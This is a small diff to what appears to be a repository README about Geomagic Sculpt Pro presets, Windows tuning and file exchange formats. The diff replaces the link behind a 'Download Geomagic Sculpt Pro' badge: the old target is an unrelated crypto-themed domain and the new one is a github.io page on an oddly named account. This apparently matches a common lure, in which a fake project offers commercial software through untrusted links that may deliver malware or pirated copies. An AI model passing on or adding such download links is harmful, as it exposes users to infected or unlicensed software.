@@ -6,7 +6,7 @@ This repository curates working presets, naming rules, and end‑to‑end workfl
 
 It focuses on Windows 10/11 tuning (drivers, caches, GPU modes) and on the IO that Geomagic Sculpt Pro users actually pass to other apps (USD, FBX, STEP, EXR, and more).
 
-[![Download Geomagic Sculpt Pro](https://img.shields.io/badge/Download-Geomagic_Sculpt_Pro-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Geomagic Sculpt Pro](https://img.shields.io/badge/Download-Geomagic_Sculpt_Pro-blueviolet)](https://bottumlunardevazier.github.io/.github/geomagic-sculpt-pro)
 
 ---
 
